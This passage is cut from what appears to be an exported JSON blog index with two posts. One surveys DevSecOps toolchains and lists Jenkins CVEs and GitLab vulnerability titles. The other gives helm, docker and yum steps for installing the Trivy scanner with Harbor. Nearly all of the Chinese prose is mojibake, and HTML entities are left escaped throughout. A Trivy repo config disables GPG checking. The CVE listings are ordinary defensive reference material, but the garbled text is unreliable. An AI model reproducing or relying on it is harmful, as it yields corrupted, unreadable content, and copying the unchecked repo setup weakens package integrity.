Response,AR)[[äº‹ä»¶å“åº”-ååŒäº‹ä»¶å“åº”å¹³å°-iris-web]]\n\n8.Predictï¼ˆé¢„æµ‹ï¼‰\næ¼æ´ç›¸å…³åˆ†æï¼šå±äºè½¯ä»¶æ¼æ´ç®¡ç†ï¼ˆApplication Vulnerability Correlationï¼ŒAVCï¼‰ã€‚æ¼æ´çš„å‘ç°è‚¯å®šæ— æ³•ä¾é å•ä¸€çš„ä¸€ç§å·¥å…·å’Œæ–¹å¼ï¼Œè€Œæ˜¯ä¼šç”±ä¸Šä¸‹æ–‡çš„SASTã€DASTã€IASTã€RASPä»¥åŠäººå·¥æ¸—é€æµ‹è¯•ç­‰å„ç§å„æ ·çš„æ‰‹æ®µå’Œå·¥å…·æ¥å®Œæˆã€‚ä½†è¿™ä¹Ÿä¼šäº§ç”Ÿæ–°çš„é—®é¢˜ï¼Œæ¯”å¦‚è¿™äº›æ–¹å¼å’Œå·¥å…·å­˜åœ¨é‡å¤æ‰«æã€éš¾ä»¥ååŒç­‰é—®é¢˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°±å‚¬ç”Ÿå‡ºAVCæ–¹æ¡ˆã€‚ç†æƒ³ä¸­çš„AVCå¯ä»¥ç®¡ç†æ‰€æœ‰å®‰å…¨å·¥å…·ï¼Œé€šè¿‡æ ‡æ³¨åŒ–æ•°æ®æ ¼å¼ç­‰æ–¹å¼ä½¿å®ƒä»¬ä¹‹é—´æ›´é«˜æ•ˆåœ°å†™ä½œï¼Œä¾æ¬¡æ›´é«˜æ•ˆåœ°å‘ç°å’Œç®¡ç†æ‰€æœ‰çš„ç¯èŠ‚çš„æ¼æ´ã€‚\nå¨èƒæƒ…æŠ¥ï¼šï¼ˆThreat intelligenceï¼ŒTIï¼‰æ˜¯åŸºäºè¯æ®çš„çŸ¥è¯†ï¼ŒåŒ…æ‹¬åœºæ™¯ã€æœºåˆ¶ã€æ ‡ç¤ºã€å«ä¹‰å’Œå¯æ“ä½œçš„å»ºè®®ã€‚è¿™äº›çŸ¥è¯†æ—¶å…³äºç°å­˜çš„æˆ–è€…æ˜¯å³å°†å‡ºç°çš„é’ˆå¯¹èµ„äº§çš„å¨èƒæˆ–å±é™©çš„ï¼Œå¯ä¸ºå“åº”ç›¸å…³å¨èƒæˆ–å¨èƒæä¾›å†³ç­–ä¿¡æ¯ã€‚å…¶ä¸­å…³é”®ä¿¡æ¯å°±æ˜¯å¤±é™·æ ‡ç¤ºï¼ˆIndicators of Compromiseï¼ŒIoCï¼‰ï¼Œå¦‚æ”»å‡»è¡ŒåŠ¨æ‰€ä½¿ç”¨çš„æœ¨é©¬åç§°ã€æ–‡ä»¶æŒ‡çº¹ã€è¿›ç¨‹ä¿¡æ¯ã€æ¶æ„åŸŸåã€C&amp;CæœåŠ¡å™¨IPç­‰ã€‚\n\nCI&#x2F;CD pipeline\nDevSecOpså·¥å…·é“¾æ•´ç†æŠ€æœ¯å’Œå·¥å…·æ˜¯å®ç°DevSecOpsçš„åŸºç¡€ã€‚åˆ©ç”¨å·¥å…·çš„æœ€ç»ˆç›®çš„æ˜¯é€šè¿‡åœ¨SDLCå„ä¸ªé˜¶æ®µå½¢æˆå·¥å…·é“¾ï¼Œå‡å°‘æ‰‹åŠ¨æ“ä½œï¼Œå®ç°æµç¨‹ç®¡ç†å’Œè‡ªåŠ¨åŒ–çš„è½åœ°ï¼Œæœ€ç»ˆæé«˜äº¤ä»˜é€Ÿåº¦ã€è´¨é‡å’Œå®‰å…¨ã€‚åœ¨æ¨åŠ¨DevSecOpséœ€è¦è€ƒè™‘çš„æµç¨‹ã€å·¥å…·å’Œæ–‡åŒ–ä¸­ï¼Œä¸€èˆ¬éƒ½æ˜¯å·¥å…·å…ˆè¡Œã€‚\n\n\n\n\nå¼€æºå·¥å…·\nå•†ç”¨å·¥å…·\n\n\n\né¡¹ç›®å’Œä»»åŠ¡ç®¡ç†å·¥å…·\nTrelloã€tasktopã€CollabNet VersionOneã€Pivotal Tracker\nJira\n\n\næºä»£ç ç®¡ç†å·¥å…·\nGitlabã€subversion\nGithubã€Gitlabã€Bitbucket\n\n\næŒç»­é›†æˆå·¥å…·\nJenkinsã€TeamCity Professionalã€CircleCI\nCloudBeeã€TeamCity Enterpriseã€Bamboo\n\n\næ„å»ºå·¥å…·\nMavenã€Gradleã€MSBuild\n\n\n\né™æ€ä»£ç åˆ†æå·¥å…·\nSonarQubeã€FindBugã€FxCopã€PMDã€Checkstyleã€Pylint CppCheckã€StylrCop\nSonarQube Enterpriseã€Coverityã€Klocwork\n\n\nå•å…ƒæµ‹è¯•æ¡†æ¶\nJunitã€Nunitã€Unittestã€CppUnit\n\n\n\nè‡ªåŠ¨åŒ–æµ‹è¯•å·¥å…·\nSeleniumã€JMeterã€Cucumberã€Postman\nHP QTPã€Quality Center\n\n\nåˆ¶å“ç®¡ç†å·¥å…·\nNexus OSSã€Artifactory OSS\nNexus Pro ã€Artifactory Enterprise\n\n\nè‡ªåŠ¨åŒ–é…ç½®å·¥å…·\nTerraformã€Ansibleã€Chefã€Puppet\nAnsible Towerã€Chef Enterpriseã€puppet Enterprise\n\n\nè‡ªåŠ¨åŒ–å‘å¸ƒå·¥å…·\nAnsibleã€Chefã€Puppet\nNolioã€Ansible Towerã€Chef Enterpriseã€puppet Enterprise\n\n\nç›‘æ§å·¥å…·\nPrometheusã€Skywalkingã€Zabbixã€Grafana\nGeneos\n\n\næ—¥å¿—åˆ†æå·¥å…·\nELK\nSplunkã€ELK Enterprise\n\n\né…ç½®ç®¡ç†å·¥å…·\nCMDB\nEasyOps\n\n\né™æ€å®‰å…¨æµ‹è¯•å·¥å…·\nSonarQubeã€NodeJsScan\nCheckMarxã€Fortifyã€Appscan\n\n\nåŠ¨æ€å®‰å…¨æ£€æµ‹å·¥å…·\nOWASP ZAP\nAWVSã€APPScanã€Webinpsect\n\n\näº¤äº’å®‰å…¨æµ‹è¯•å·¥å…·\nContrast Security-Community\nContrast Security\n\n\nç¬¬ä¸‰æ–¹å®‰å…¨æ‰«æå·¥å…·\nDependency-Check\nSonatype IQ Server\n\n\nå¨èƒå»ºæ¨¡å·¥å…·\nOWASP Threat Dragonã€å¾®è½¯å®˜æ–¹å¨èƒå»ºæ¨¡å·¥å…·\nIrisRisk\n\n\n\nåœ¨è½¯ä»¶ä¾›åº”é“¾ä¸­æ¯ä¸ªé˜¶æ®µéƒ½åœ¨é¢ä¸´ä¸åŒçš„å®‰å…¨é£é™©ï¼Œä¸ºäº†æ›´å¥½çš„å¯¹è½¯ä»¶ä¾›åº”é“¾è¿›è¡Œé£é™©æ²»ç†ï¼Œåœ¨ DevSecOps æ¨¡å¼ ä¸‹ï¼Œå®‰å…¨å¼€å‘å·¥å…·é“¾éœ€è¦å°½é‡è¦†ç›–è½¯ä»¶ç”Ÿå‘½å‘¨æœŸä¸­çš„æ‰€æœ‰é˜¶æ®µ\nDevSecOps æ•æ·å®‰å…¨æŠ€æœ¯é‡‘å­—å¡”DevSecOps æ•æ·å®‰å…¨æŠ€æœ¯é‡‘å­—å¡”åœ¨ã€Š2020 DevSecOps è¡Œä¸šæ´å¯ŸæŠ¥å‘Šã€‹ä¸­é¦–æ¬¡è¢«æå‡ºï¼Œ ç›®å‰å·²å‘å±•åˆ° 2.0 ç‰ˆæœ¬ã€‚å…¶æè¿°äº†ä¸€ç»„å±‚æ¬¡ç»“æ„ï¼Œé‡‘å­—å¡”åº•éƒ¨æ˜¯åŸºç¡€æ€§æŠ€æœ¯ï¼Œè¶Šä¸Šå±‚çš„æŠ€æœ¯å¯¹ DevSecOps å®è·µæˆ ç†Ÿåº¦çš„è¦æ±‚è¶Šé«˜ã€‚DevSecOps æ•æ·å®‰å…¨æŠ€æœ¯é‡‘å­—å¡”çš„ä¸æ–­å‡çº§ï¼Œæ˜¯ä¸ºäº†ç»™ä¸šç•Œæ›´å¥½çš„é¢„æµ‹å’Œå‚è€ƒï¼Œå…³äº DevSecOps æ•æ·å®‰å…¨æŠ€æœ¯ æœªæ¥æ¼”è¿›æ–¹å‘çš„é¢„æµ‹æ˜¯å¼€æ”¾ä¸”æŒç»­æ€§çš„ï¼Œéšç€ DevSecOps å®è·µçš„ä¸æ–­å‘å±•ï¼Œå…¶ä¸­çš„å®‰å…¨å·¥å…·ä¼šè¿›è¡Œè°ƒæ•´å’Œæ›´æ–°ã€‚\nDevSecOpså·¥å…·é“¾çš„æ½œåœ¨é£é™©\n\n\nå·¥å…·åç§°\næš´éœ²èµ„äº§æ•°\n\n\n\nJenkins\n16226\n\n\nGitLab\n9035\n\n\nGithub\n538\n\n\nChef\n12\n\n\nDatadog\n11\n\n\nSpinnaker\n8\n\n\nTerraform\n4\n\n\nOctopus Deploy\n2\n\n\nJenkinsJenkinsæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¼€æºè‡ªåŠ¨åŒ–æœåŠ¡å™¨ï¼Œæ˜¯ä¸€æ¬¾æä¾›å‹å¥½æ“ä½œç•Œé¢çš„æŒç»­é›†æˆ(CI)çš„å·¥å…·ï¼Œå¯ç”¨äºè‡ªåŠ¨åŒ–å„ç§ä»»åŠ¡ï¼Œå¦‚æ„å»ºï¼Œæµ‹è¯•å’Œéƒ¨ç½²è½¯ä»¶ç­‰ã€‚Jenkinsç›¸å…³æ¼æ´ç¼“è§£æªæ–½å‚è€ƒ[å®˜ç½‘](Fetching Title#nij6æ’ä»¶Handling Vulnerabilities in Plugins\n\n\n\nCVE  ID\nCVSS 3.0\nå½±å“èµ„äº§æ•°\nå½±å“é¢\n\n\n\nCVE-2021-21685\n9.1\n9582\n92.7%\n\n\nCVE-2021-21686\n8.1\n9582\n92.7%\n\n\nCVE-2021-21687\n9.1\n9582\n92.7%\n\n\nCVE-2021-21688\n7.5\n9582\n92.7%\n\n\nCVE-2021-21689\n9.1\n9582\n92.7%\n\n\nCVE-2021-21690\n9.8\n9582\n92.7%\n\n\nCVE-2021-21691\n9.8\n9582\n92.7%\n\n\nCVE-2021-21692\n9.8\n9582\n92.7%\n\n\nCVE-2021-21693\n9.8\n9582\n92.7%\n\n\nCVE-2021-21694\n9.8\n9582\n92.7%\n\n\nCVE-2021-21695\n8.8\n9582\n92.7%\n\n\nCVE-2021-21696\n9.8\n9582\n92.7%\n\n\nCVE-2021-21697\n9.1\n9582\n92.7%\n\n\nCVE-2021-21671\n7.5\n8576\n83%\n\n\nCVE-2021-21604\n8.0\n5666\n54.8%\n\n\nCVE-2021-21605\n8.0\n5666\n54.8%\n\n\nCVE-2020-2160\n8.8\n2953\n28.6%\n\n\nCVE-2020-2099\n8.6\n2283\n22.1%\n\n\ngitlabä¸€.issueç›¸å…³çš„gitlabæ¼æ´ç³»åˆ—-guestç”¨æˆ·è¶Šæƒåˆ›å»ºæ–°çš„æµ‹è¯•ç”¨ä¾‹\ngitlabæ¼æ´ç³»åˆ—-è¶Šæƒè®¿é—®å†…éƒ¨  \ngtilabæ¼æ´ç³»åˆ—-å…¬å…±é¡¹ç›®ä¸­è¢«ç§»é™¤çš„reporterä»ç„¶å¯ä»¥ä¿®æ”¹æ•æ„ŸæŠ¥å‘Š  \ngitlabæ¼æ´ç³»åˆ—-ç”±markdownæ‰€å¯¼è‡´çš„æƒé™é—®é¢˜  \näºŒ.groupç›¸å…³çš„gitlabæ¼æ´ç³»åˆ—-è¶Šæƒè®¿é—®å†…éƒ¨\ngitlabæ¼æ´ç³»åˆ—-guestç”¨æˆ·è¶Šæƒæ›´æ”¹äº‹ä»¶ä¸¥é‡æ€§\ngitlabæ¼æ´ç³»åˆ—-ç»•è¿‡ipé™åˆ¶æŸ¥çœ‹ç»„é¡¹ç›®\ngitlabæ¼æ´ç³»åˆ—-å›¢é˜Ÿæˆå‘˜å¯ä»¥æå‡ä»–ä»¬ç»´æŠ¤æ‰€å¯¼å…¥é¡¹ç›®çš„æƒé™  \ngitlabæ¼æ´ç³»åˆ—-è¯•ç”¨è®¸å¯è¯è¶Šæƒå¯ä»¥åœ¨gitlab.comä¸Šåˆ›å»ºé¡¹ç›®è®¿é—®ä»¤ç‰Œ  \ngitlabæ¼æ´ç³»åˆ—-æ–‡ä»¶æ¨¡æ¿é¡¹ç›®IDæ³„éœ²  \ngitlabæ¼æ´ç³»åˆ—-åˆ©ç”¨2FAæœºåˆ¶å¯ä»¥å±è”½ç”¨æˆ·  \ngitlabæ¼æ´ç³»åˆ—-Create groupsåŠŸèƒ½ä¸­å­˜åœ¨å­˜å‚¨å‹xss  \ngitlabæ¼æ´ç³»åˆ—-å­ç»„çš„å¼€å‘äººå‘˜å¯ä»¥è¶Šæƒè®¿é—®ä¸»ç§æœ‰ç»„  \ngitlabæ¼æ´-è¶Šæƒæ·»åŠ å…·æœ‰ä¸åŒåŸŸåç”µå­é‚®ä»¶åœ°å€çš„æˆå‘˜  \ngitlabæ¼æ´ç³»åˆ—-groupè·¯å¾„æ³„éœ²  \ngitlabæ¼æ´ç³»åˆ—-è¯•ç”¨è®¸å¯è¯è¶Šæƒå¯ä»¥åœ¨gitlab.comä¸Šåˆ›å»ºé¡¹ç›®è®¿é—®ä»¤ç‰Œ  \nä¸‰.åˆå¹¶è¯·æ±‚ç›¸å…³çš„(åˆ†æ”¯ç›¸å…³)gitlabæ¼æ´ç³»åˆ—-åˆå¹¶è¯·æ±‚ä¿¡æ¯æ³„éœ²\ngitlabæ¼æ´ç³»åˆ—-Guestç”¨æˆ·è¶Šæƒé‡æ–°è¯„è®º\ngitlabæ¼æ´ç³»åˆ—-ä½¿ç”¨æœªç»éªŒè¯çš„ç”µå­é‚®ä»¶åœ°å€ç»•è¿‡Require Code Owner approvalæœºåˆ¶  \ngitlabæ¼æ´ç³»åˆ—-è¶Šæƒä¸‹è½½æ–‡ä»¶  \ngitlabæ¼æ´ç³»åˆ—-æ–°ä»“åº“ä¸­å¯ä»¥åˆ‡æ¢è‡³ä¸å—ä¿æŠ¤åˆ†æ”¯åŒåçš„Tagä»¥æ›¿æ¢åŸåˆ†æ”¯  \ngitlabæ¼æ´ç³»åˆ—-è¶Šæƒè·å–åˆå¹¶äº‹ä»¶çš„ä¸ªæ•°\ngitlabæ¼æ´ç³»åˆ—-ç§æœ‰é¡¹ç›®åˆ†æ”¯åç§°æ³„éœ²\ngitlabæ¼æ´ç³»åˆ—-â€œå¤–éƒ¨çŠ¶æ€æ£€æŸ¥â€APIæ³„æ¼å…³äºå®ä¾‹çš„çŠ¶æ€æ£€æŸ¥çš„æ•°æ®  \nå››.ç”µå­é‚®ç®±ç›¸å…³çš„gitlabæ¼æ´ç³»åˆ—-ä½¿ç”¨æœªç»éªŒè¯çš„ç”µå­é‚®ä»¶åœ°å€ç»•è¿‡Require Code Owner approvalæœºåˆ¶\ngitlabåœ¨æ¼æ´ç³»åˆ—-è¶ŠæƒæŸ¥çœ‹æˆå‘˜ä¿¡æ¯\ngitlabæ¼æ´-è¶Šæƒæ·»åŠ å…·æœ‰ä¸åŒåŸŸåç”µå­é‚®ä»¶åœ°å€çš„æˆå‘˜  \ngitlabæ¼æ´-Oauth Webåº”ç”¨æ¼æ´  \ngitlabæ¼æ´ç³»åˆ—-è¶ŠæƒéªŒè¯ä»»ä½•é‚®ç®±  \ngitlabæ¼æ´ç³»åˆ—-ç”¨æˆ·é‚®ä»¶ä»è¿‡æœŸçš„ä»¤ç‰Œä¸­æ³„éœ²  \näº”.ä½¿ç”¨apiæ¥è®¿é—®çš„gitlabæ¼æ´ç³»åˆ—-è¶Šæƒè®¿é—®å†…éƒ¨\ngitlabæ¼æ´ç³»åˆ—-åˆå¹¶è¯·æ±‚ä¿¡æ¯æ³„éœ²\ngitlabæ¼æ´-æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç®¡é“æ•°æ®\ngitlabæ¼æ´ç³»åˆ—-guestç”¨æˆ·è¶Šæƒåˆ›å»ºæ–°çš„æµ‹è¯•ç”¨ä¾‹\ngitlabæ¼æ´ç³»åˆ—-ç»•è¿‡Disabled Repoæœºåˆ¶  \ngitlabæ¼æ´ç³»åˆ—-guestç”¨æˆ·è¶Šæƒçœ‹åˆ°æ ‡ç­¾åç§°  \ngitlabæ¼æ´ç³»åˆ—-è¶Šæƒæ›´æ”¹é¡¹ç›®å¯è§æ€§  \ngitlabæ¼æ´-æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç®¡é“æ•°æ®  \ngitlabæ¼æ´ç³»åˆ—-å­˜å‚¨å‹XSSæ‰€å¯¼è‡´çš„ç®¡ç†å‘˜æƒé™å‡çº§  \ngitlabæ¼æ´ç³»åˆ—-â€œå¤–éƒ¨çŠ¶æ€æ£€æŸ¥â€APIæ³„æ¼å…³äºå®ä¾‹çš„çŠ¶æ€æ£€æŸ¥çš„æ•°æ®  \nå…­.ç®¡é“ç›¸å…³çš„(ä¸ci&#x2F;cdä¸šåŠ¡ç›¸å…³çš„)gitlabæ¼æ´-æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç®¡é“æ•°æ®\ngitlabæ¼æ´ç³»åˆ—-æœªæˆæƒç”¨æˆ·å¯èƒ½è§¦å‘éƒ¨ç½²åˆ°å—ä¿æŠ¤ç¯å¢ƒ  \ngitlabæ¼æ´-æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç®¡é“æ•°æ®  \ngitlabæ¼æ´ç³»åˆ—-ç»•è¿‡CI&#x2F;CDç»™å®šé…é¢é™åˆ¶  \nä¸ƒ.è®¤è¯æœºåˆ¶ç›¸å…³(2FA)gitlabæ¼æ´ç³»åˆ—-Gitlab Pages Auth Bypass  \ngitlabæ¼æ´ç³»åˆ—-2FAè¢«é‡å¤åˆ©ç”¨  \ngitlabæ¼æ´ç³»åˆ—-NPMæ³¨å†Œè¡¨æ¥å—OAuth2ä»¤ç‰Œ  \ngitlabæ¼æ´ç³»åˆ—-æœªç»æˆæƒè®¿é—®wiki  \ngitlabæ¼æ´ç³»åˆ—-åˆ©ç”¨2FAæœºåˆ¶å¯ä»¥å±è”½ç”¨æˆ·  \ngitlabæ¼æ´ç³»åˆ—-/profile/applicationsæ²¡æœ‰2FAæœºåˆ¶å¯¼è‡´æƒé™å‡çº§  \nå…«.é¡¹ç›®åŸºæœ¬è®¾ç½®åŠŸèƒ½gitlabæ¼æ´ç³»åˆ—-é¡¹ç›®è®¾ç½®ä¸­UIé€»è¾‘æ¼æ´å¯¼è‡´é¡¹ç›®æ•°æ®æ³„éœ²  \ngitlabæ¼æ´ç³»åˆ—-é¡¹ç›®ç»„æˆå‘˜è¶Šæƒæ”¶åˆ°é‚€è¯·  \ngitlabæ¼æ´ç³»åˆ—-è¶Šæƒè®¾ç½®æ—¥æœŸ  \ngitlabæ¼æ´ç³»åˆ—-æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥è§£é”é¡¹ç›®çš„é”å®šæ–‡ä»¶  \ngitlabæ¼æ´ç³»åˆ—-ç»•è¿‡æ¥å—æ¡æ¬¾åˆ é™¤è‡ªå·±çš„å¸æˆ·  \ngitlabæ¼æ´ç³»åˆ—-ä»»ä½•ç”¨æˆ·åœ¨æˆæƒåéƒ½å¯ä»¥æ£€ç´¢OAuthåº”ç”¨ç¨‹åºå®¢æˆ·ç«¯æ•æ„Ÿä¿¡æ¯  \ngitlabæ¼æ´ç³»åˆ—-è¶ŠæƒæŸ¥çœ‹ç”¨æˆ·ç§æœ‰ä¿¡æ¯  \ngitlabæ¼æ´ç³»åˆ—-è¶Šæƒè·å–ä»»ä½•é¡¹ç›®çš„ç‰¹æ€§æ ‡å¿—ç”¨æˆ·åˆ—è¡¨(åŒ…æ‹¬ç”¨æˆ·id)  \ngitlab-ç”¨æˆ·è¶Šæƒå›å¤æ¼æ´æŠ¥å‘Š  \nä¹.ä¸æœ¬åœ°å®ä¾‹ç›¸å…³çš„gitlabæ¼æ´ç³»åˆ—-å®‰è£…Gitlab runnerä¸Docker-In-Dockerå…è®¸rootæƒé™  \ngitlabæ¼æ´ç³»åˆ—-ç”±å¤–éƒ¨æˆæƒæ‰€å¯¼è‡´çš„blind SSRF\ngitlabæ¼æ´ç³»åˆ—-ç”¨æˆ·è¶Šæƒè®¿é—®å†…éƒ¨é¡¹ç›®\nå.å…¶ä»–gitlabæ¼æ´ç³»åˆ—-ç”¨æˆ·æ³„éœ²Gitlabæ•æ„Ÿä¿¡æ¯  \ngitlabæ¼æ´ç³»åˆ—-GitHubä»¤ç‰Œæ³„éœ²\nConfluence[[Atlassian Confluence OGNLè¡¨è¾¾å¼ä»»æ„æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-26134ï¼‰]][[Atlassian Confluenceè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ¼æ´ï¼ˆCVE-2019-3396ï¼‰]][[Atlassian Jira Seraph è®¤è¯ç»•è¿‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-0540ï¼‰]]\nğŸ“šå‚è€ƒSAST æµ‹è¯•ä¸­è¦æµ‹é‡çš„ä¸‰ä¸ªå‚æ•°You canâ€™t compare SAST tools using only lists, test suites, and benchmarks | SnykIAST | æ´æ€æ–‡æ¡£GitLab Critical Security Release: 15.1.1, 15.0.4, and 14.10.5 | GitLabDevOpsé£é™©æµ‹ç»˜ä¹‹ä»£ç ç¯‡gitlabGitlabå¸¸è§æ¼æ´å¤ç°åŠååˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\n","slug":"Devsecopså·¥å…·é“¾","date":"2022-02-08T02:58:04.000Z","categories_index":"DevSecOps","tags_index":"DevSecOpså·¥å…·é“¾,CI/CD,å·¥å…·é“¾é£é™©","author_index":"Moses"},{"id":"f80e788fa76fb3d65b76873268419752","title":"å®¹å™¨å®‰å…¨å¹³å°-Trivy","content":"ä»‹ç»Trivyæ˜¯ä¸€æ¬¾ç®€å•è€Œå…¨é¢çš„æ‰«æä»ªï¼Œç”¨äºå¤„ç†å®¹å™¨æ˜ åƒã€æ–‡ä»¶ç³»ç»Ÿå’ŒGitå­˜å‚¨åº“ä¸­çš„æ¼æ´ä»¥åŠé…ç½®é—®é¢˜ã€‚Trivyæ£€æµ‹æ“ä½œç³»ç»ŸåŒ…ï¼ˆAlpineã€RHELã€CentOSç­‰ï¼‰å’Œç‰¹å®šè¯­è¨€åŒ…ï¼ˆBundlerã€Composerã€npmã€yarnç­‰ï¼‰çš„æ¼æ´ã€‚æ­¤å¤–ï¼ŒTrivyå°†åŸºç¡€è®¾æ–½æ‰«æä¸ºä»£ç ï¼ˆIaCï¼‰æ–‡ä»¶ï¼Œå¦‚Terraformã€Dockerfileå’ŒKubernetesï¼Œä»¥æ£€æµ‹ä½¿æ‚¨çš„éƒ¨ç½²é¢ä¸´æ”»å‡»é£é™©çš„æ½œåœ¨é…ç½®é—®é¢˜ã€‚Trivyæ˜“äºä½¿ç”¨.trivyå·²ç»æˆäº†harbor v.2.2.1çš„é»˜è®¤å®‰å…¨æ‰«ææ’ä»¶\ntrivyç›®å‰åˆ†ä¸ºå®‰è£…ç‰ˆå’Œhaboré›†æˆç‰ˆ\nåŠŸèƒ½å¯¹æ¯”\nå®‰è£…éƒ¨ç½²é›†æˆç‰ˆæ¶æ„\nhelmå®‰è£…Harbor&gt;&#x3D;2.0ç‰ˆæœ¬Trivyå·²é»˜è®¤é›†æˆã€‚harbor chart&gt;&#x3D;1.4å¯ä»¥ä½¿ç”¨å®˜æ–¹Helmå®‰è£…\nhelm repo add harbor https:&#x2F;&#x2F;helm.goharbor.io\nhelm install harbor harbor&#x2F;harbor \\\n  --create-namespace \\\n  --namespace harbor \\\n  --set clair.enabled&#x3D;false \\\n  --set trivy.enabled&#x3D;true\nHarbor 1.10 on Kubernetes\nhelm repo add aqua https:&#x2F;&#x2F;aquasecurity.github.io&#x2F;helm-charts\nhelm install harbor-scanner-trivy aqua&#x2F;harbor-scanner-trivy \\\n  --namespace harbor --create-namespace\nRHEL&#x2F;CentOSæ‰‹åŠ¨éƒ¨ç½²å®‰è£…docker\n  cd &#x2F;etc&#x2F;yum.repos.d&#x2F;  \n  wget http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo  \n  yum makecache  \n  yum install docker-ce  -y  &amp;&amp; systemctl start docker &amp;&amp; systemctl enable docker  \n  \n  \n  vim &#x2F;etc&#x2F;docker&#x2F;daemon.json  \n  \n&#123;  \n&quot;exec-opts&quot;: [&quot;native.cgroupdriver&#x3D;systemd&quot;],    \n&quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;docker.mirrors.ustc.edu.cn&quot;]  \n&#125;  \n  \n systemctl  restart  docker\nå®‰è£…docker-compose\ncurl -L &quot;https:&#x2F;&#x2F;github.com&#x2F;docker&#x2F;compose&#x2F;releases&#x2F;download&#x2F;1.23.2&#x2F;docker-compose-$(uname -s)-$(uname -m)&quot; -o &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose  \n\nchmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose\nä¸‹è½½harbor\nwget  https:&#x2F;&#x2F;github.com&#x2F;goharbor&#x2F;harbor&#x2F;releases&#x2F;download&#x2F;v2.2.3&#x2F;harbor-offline-installer-v2.2.3.tgz\nä¿®æ”¹ harbor.ymlé…ç½®æ–‡ä»¶ï¼Œç”Ÿäº§ç¯å¢ƒè¯·ç”¨httpsï¼Œè¿™é‡Œä»…ç”¨äºæµ‹è¯•\ntar xf harbor-offline-installer-v2.2.3.tgz   \ncp harbor.yml.tmpl harbor.yml  \n  \n.&#x2F;prepare   \n.&#x2F;install.sh  --with-trivy  --with-chartmuseum\nVmware Harbor æä¾›äº†ä¸€ä¸ªAPI æ¥å£ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸SOC é›†æˆï¼ŒæŸ¥çœ‹images çš„å®‰å…¨æƒ…å†µã€‚\n&#x2F;projects&#x2F;&#123;project_name&#125;&#x2F;repositories&#x2F;&#123;repository_name&#125;&#x2F;artifacts&#x2F;&#123;reference&#125;&#x2F;additions&#x2F;vulnerabilities    \n  \n  \ncurl -X GET &quot;http:&#x2F;&#x2F;172.16.116.5&#x2F;api&#x2F;v2.0&#x2F;projects&#x2F;library&#x2F;repositories&#x2F;fastjson&#x2F;artifacts&#x2F;1.2.24&#x2F;additions&#x2F;vulnerabilities&quot; -H &quot;accept: application&#x2F;json&quot; -H &quot;X-Request-Id: 111&quot;\nå®‰è£…ç‰ˆRHEL&#x2F;CentOS#æ·»åŠ æº\n$ sudo vim &#x2F;etc&#x2F;yum.repos.d&#x2F;trivy.repo [trivy] name&#x3D;Trivy repository baseurl&#x3D;https:&#x2F;&#x2F;aquasecurity.github.io&#x2F;trivy-repo&#x2F;rpm&#x2F;releases&#x2F;$releasever&#x2F;$basearch&#x2F; gpgcheck&#x3D;0 enabled&#x3D;1 $ sudo yum -y update $ sudo yum -y install trivy\nRPMrpm -ivh https:&#x2F;&#x2F;github.com&#x2F;aquasecurity&#x2F;trivy&#x2F;releases&#x2F;download&#x2F;v0.22.0&#x2F;trivy_0.22.0_Linux-64bit.rpm\ndockerdocker pull aquasec&#x2F;harbor-scanner-trivy:0.25.0\n\ndocker run --rm -v [YOUR_CACHE_DIR]:&#x2F;root&#x2F;.cache&#x2F; aquasec&#x2F;trivy:0.25.0 [YOUR_IMAGE_NAME]\n\n#éƒ¨ç½²Redis\n$docker run --name redis -d --rm redis:5\n#éƒ¨ç½²trivy-adapter\ndocker run --name trivy-adapter -d --rm \\\n  -p 8181:8181 \\\n adapter,core,redis&#39; \\\n  -e &quot;SCANNER_LOG_LEVEL&#x3D;trace&quot; \\\n  -e &quot;SCANNER_TRIVY_DEBUG_MODE&#x3D;true&quot; \\\n  -e &quot;TRIVY_NON_SSL&#x3D;true&quot; \\\n  -e &quot;SCANNER_API_SERVER_ADDR&#x3D;:8181&quot; \\\n  -e &quot;SCANNER_STORE_REDIS_URL&#x3D;redis:&#x2F;&#x2F;redis:6379&quot; \\\n  -e &quot;SCANNER_JOB_QUEUE_REDIS_URL&#x3D;redis:&#x2F;&#x2F;redis:6379&quot; \\\n  --network harbor_harbor \\\n  aquasec&#x2F;harbor-scanner-trivy:0.25.0\n\n\nå‚æ•°åˆ—è¡¨ï¼š\n\n\n\nName\nDefault\nDescription\n\n\n\nSCANNER_LOG_LEVEL\ninfo\nThe log level of trace, debug, info, warn, warning, error, fatal or panic. The standard logger logs entries with that level or anything above it.\n\n\nSCANNER_API_SERVER_ADDR\n:8080\nBinding address for the API server\n\n\nSCANNER_API_SERVER_TLS_CERTIFICATE\nN&#x2F;A\nThe absolute path to the x509 certificate file\n\n\nSCANNER_API_SERVER_TLS_KEY\nN&#x2F;A\nThe absolute path to the x509 private key file\n\n\nSCANNER_API_SERVER_CLIENT_CAS\nN&#x2F;A\nA list of absolute paths to x509 root certificate authorities that the api use if required to verify a client certificate\n\n\nSCANNER_API_SERVER_READ_TIMEOUT\n15s\nThe maximum duration for reading the entire request, including the body\n\n\nSCANNER_API_SERVER_WRITE_TIMEOUT\n15s\nThe maximum duration before timing out writes of the response\n\n\nSCANNER_API_SERVER_IDLE_TIMEOUT\n60s\nThe maximum amount of time to wait for the next request when keep-alives are enabled\n\n\nSCANNER_TRIVY_CACHE_DIR\n&#x2F;home&#x2F;scanner&#x2F;.cache&#x2F;trivy\nTrivy cache directory\n\n\nSCANNER_TRIVY_REPORTS_DIR\n&#x2F;home&#x2F;scanner&#x2F;.cache&#x2F;reports\nTrivy reports directory\n\n\nSCANNER_TRIVY_DEBUG_MODE\nfalse\nThe flag to enable or disable 